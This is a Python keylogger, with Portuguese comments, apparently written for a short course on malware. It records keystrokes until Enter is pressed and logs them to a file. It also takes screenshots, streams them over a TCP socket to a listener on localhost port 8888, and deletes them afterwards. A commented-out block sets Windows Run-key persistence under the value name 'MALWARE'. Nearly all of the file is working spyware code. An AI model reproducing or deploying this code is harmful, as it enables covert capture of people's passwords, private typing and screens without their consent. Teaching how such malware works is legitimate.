#Bibliotecas necessarias para adicionar o programa no registro, e fazer ele rodar sempre
from os.path import realpath
from winreg import *
import sys


#Biblioteca necessaria para fazer o keylogger
import keyboard

#Bibliotecas para pegar e remover os screen shots
from pyscreenshot import grab_to_file
from os import remove

#Biblioteca para envio dos dados
import socket

""" 
#=============================================================================
# Secao para adicionar o malware no registro do windows
# Não utilizado no minicurso - A titulo de curiosidade
#=============================================================================

try:
    caminho_arquivo = realpath(__file__)
    run = r'Software\Microsoft\Windows\CurrentVersion\Run' #TBA
except:
    errorFile = open("error.txt", "a+")
    errorFile.write("Erro run")
    errorFile.close()


try:
    key = OpenKey(HKEY_LOCAL_MACHINE, run, 0, KEY_SET_VALUE)
except PermissionError:

    #nao esta rodando como administrador, podemos desistir
    raise SystemExit(0)
else:
    errorFile = open("error.txt", "a+")
    errorFile.write("Rodando normal %s" % key)
    errorFile.close()
    SetValueEx(key,'MALWARE',0,REG_SZ,path_arquivo)
    errorFile = open("error.txt", "a+")
    errorFile.write("Continua rodando")
    errorFile.close()
    key.Close()
"""

#=============================================================================
#=============================================================================
#Sessao de keylogger

# Função que limpa as teclas que tem nomes extensos
def process_event_name(tecla):
    #teclas especiais, a serem trocadas pelo valor ascii, nao o nome da tecla
    teclas_especiais = {'space':' ', 'enter':'\n', 'tab':'\t', 'backspace' : '\b'}

    #checa se a tecla apertada é uma dessas especiais
    if(tecla.name in teclas_especiais.keys()):
        valor = teclas_especiais[tecla.name]
    else:
        #se nao estiver, so precisamos adicionar o nome da tecla
        valor = tecla.name

    return valor


#==================================================================================
# Enviando as informações obtidas
#==================================================================================

def envia(f_name):
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.connect(('localhost',8888))
    with open(f_name,'rb') as f:
        rd = f.read(64)
        while(len(rd) == 64):
            soc.sendall(rd)
            rd = f.read(64)
        if(rd):
            soc.sendall(rd)
    soc.close()


#==================================================================================
# Lidando com screenshots
#==================================================================================

def screenshot(shot):
    f_name = 'screenshot_{}.png'.format(shot)
    # Salva no arquivo
    grab_to_file(f_name)

    # Envia para o servidor
    envia(f_name)

    # Deleta do cliente
    remove(f_name)


#==================================================================================
# O Keylogger
# Utiliza uma função que espera até que a tecla enter seja apertada
# Então tira um print (chama screenshot) e escreve no arquivo as teclas apertadas
#==================================================================================

shot = 0

while(True):
    with open("output.txt","a+") as arquivo:
        events = keyboard.record('enter')
        screenshot(shot)
        shot += 1

        # Armazena somente quando aperta (nao quando solta)
        keys = [process_event_name(k) for k in events if k.event_type == 'down']
        arquivo.write(''.join(keys))
    